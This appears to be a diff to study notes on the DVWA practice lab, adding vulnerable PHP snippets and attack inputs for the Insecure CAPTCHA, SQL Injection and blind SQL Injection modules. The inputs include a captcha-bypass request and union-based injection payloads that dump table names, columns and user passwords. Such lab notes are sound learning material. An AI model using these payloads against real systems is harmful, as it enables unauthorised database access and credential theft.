@@ -92,11 +92,36 @@ File Upload
 	$target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 
 	
 Insecure CAPTCHA
-
+	if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) { }
+	if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) { }
+		step=1&password_new=1&password_conf=1&Change=Change
+	if( !$_POST[ 'passed_captcha' ] ) { }
+		step=2&password_new=123&password_conf=123&Change=Change&passed_captcha=ture
+	
 SQL Injection
-	2" or 1=1 -- +
-	1' union all select @@datadir,@@basedir#
+	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
+		2" or 1=1 -- +
+		1' union all select @@datadir,@@basedir#
+		1' order by 2 #
+		1' union select version(),database() #
+		1' union select 1,group_concat(table_name)from information_schema.tables where table_schema='users' #
+		1' union select 1,group_concat(column_name)from information_schema.columns where table_name='users' #
+		1' union select user,password from dvwa.users #
+	$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id); 
+	$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; 
+		id=1&Submit=Submit  ->  id=1 or 1=1 # &Submit=Submit
+		
+	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+
 SQL Injection (Blind)
+	$getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid );
+		id=1' and substr(database(),1,1)='d' #
+	$id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : xx;
+		burpsuite->sqlmap
+		
+	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+	
 Weak Session IDs
 XSS (DOM)
 XSS (Reflected)
